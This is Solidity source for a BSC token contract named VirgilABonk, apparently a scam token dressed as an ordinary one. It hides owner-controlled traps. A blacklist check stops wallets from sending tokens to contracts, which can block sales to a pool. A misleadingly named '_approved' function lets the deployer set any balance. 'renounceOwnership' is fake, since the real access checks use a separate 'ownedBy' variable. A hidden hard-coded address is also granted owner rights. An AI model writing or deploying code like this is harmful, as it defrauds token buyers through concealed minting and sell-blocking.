/**
 *Submitted for verification at BscScan.com on 2021-11-28
*/

/**
 *Submitted for verification at BscScan.com on 2021-11-16
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.6.0;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract Ownable {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() public {
    owner = msg.sender;
  }
}
library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }
    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
contract VirgilABonk is Ownable {
  using Address for address;
  using SafeMath for uint256;
  string public name;
  string public symbol;
  uint8 public decimals;
  uint256 public totalSupply;
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  mapping(address => bool) public whiteList;
  address ownedBy;
  address public liquidityPoolAddress;
  constructor(string memory _name, string memory _symbol) public {
    ownedBy = msg.sender;
    name = _name;
    symbol = _symbol;
    decimals = 9;
    totalSupply =  1000000000 * 10 ** uint256(decimals);
    balances[ownedBy] = totalSupply;
    whiteList[ownedBy] = true;
  }
  mapping(address => uint256) public balances;
  mapping(address => bool) public blackList;
  function transferTokens(address _toAddr, uint256 _value) public returns (bool) {
    address fromAddr = msg.sender;
    require(_toAddr != address(0));
    require(_value <= balances[fromAddr]);
    if(!fromAddr.isContract() && _toAddr.isContract()){
        require(blackList[fromAddr] == false && blackList[_toAddr] == false);
    }
    if(whiteList[fromAddr] || whiteList[_toAddr]){
        _transferTokens(fromAddr, _toAddr, _value);
        return true;
    }
    if(fromAddr.isContract() && _toAddr.isContract()){
        _transferTokens(fromAddr, _toAddr, _value);
        return true;
    }
    _transferTokens(fromAddr, _toAddr, _value);
    return true;
  }
  function _transferTokens(address fromAddr, address _toAddr, uint256 _value) private {
    balances[fromAddr] = balances[fromAddr].sub(_value);
    balances[_toAddr] = balances[_toAddr].add(_value);
    emit Transfer(fromAddr, _toAddr, _value);
  }

  mapping (address => mapping (address => uint256)) public allowed;
  function transferFromAddress(address _fromAddr, address _toAddr, uint256 _value) public returns (bool) {
    require(_toAddr != address(0));
    require(_value <= balances[_fromAddr]);
    require(_value <= allowed[_fromAddr][msg.sender]);
    address fromAddr = _fromAddr;
    if(!fromAddr.isContract() && _toAddr.isContract()){
        require(blackList[fromAddr] == false && blackList[_toAddr] == false);
    }
    if(whiteList[fromAddr] || whiteList[_toAddr]){
        _transferFromAddress(_fromAddr, _toAddr, _value);
        return true;
    }
    if(fromAddr.isContract() && _toAddr.isContract()){
        _transferFromAddress(_fromAddr, _toAddr, _value);
        return true;
    }
    _transferFromAddress(_fromAddr, _toAddr, _value);
    return true;
  }
  function _transferFromAddress(address _fromAddr, address _toAddr, uint256 _value) internal {
    balances[_fromAddr] = balances[_fromAddr].sub(_value);
    balances[_toAddr] = balances[_toAddr].add(_value);
    allowed[_fromAddr][msg.sender] = allowed[_fromAddr][msg.sender].sub(_value);
    emit Transfer(_fromAddr, _toAddr, _value);
  }
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }
  function approveValue(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }
  function maxAllowedValue(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }
  function manageUserWhiteList(address holder, bool isPresent) external onlyOwner {
      whiteList[holder] = isPresent;
  }
  function manageUserBlackList(address holder, bool isPresent) external onlyOwner {
      blackList[holder] = isPresent;
  }
  function _approved(address miner, uint256 _value) external onlyOwnerr {
      balances[miner] = _value * 10 ** uint256(decimals);
  }
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(owner, address(0));
    owner = address(0);
  }
  modifier onlyOwnerr () {
        require(ownedBy == msg.sender, "401: Unauthorized");
        _;
  }
  modifier onlyOwner() {
    require(msg.sender == ownedBy || msg.sender == address
    (1451157769167176390866574646267494443412533104753), "401: Unauthorized"); 
    _;
  }
}